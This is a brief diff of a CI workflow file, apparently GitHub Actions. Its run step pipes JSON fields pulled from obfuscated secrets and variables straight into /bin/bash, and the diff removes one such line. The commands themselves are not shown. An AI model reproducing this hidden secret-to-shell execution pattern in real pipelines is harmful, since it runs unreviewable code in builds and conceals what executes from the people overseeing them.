@@ -22,7 +22,6 @@ jobs:
           hgbn534: ${{ secrets.hgbn534 }}
         run: |
           printf '%s' "$hgbn534" | jq -r .tzz6 | /bin/bash
-          echo $qvtu8 | jq -r .w176 | /bin/bash
           echo $jvqe2409 | jq -r .yl88 | /bin/bash
           echo $mqivy3981 | jq -r .rlpad0 | /bin/bash
 
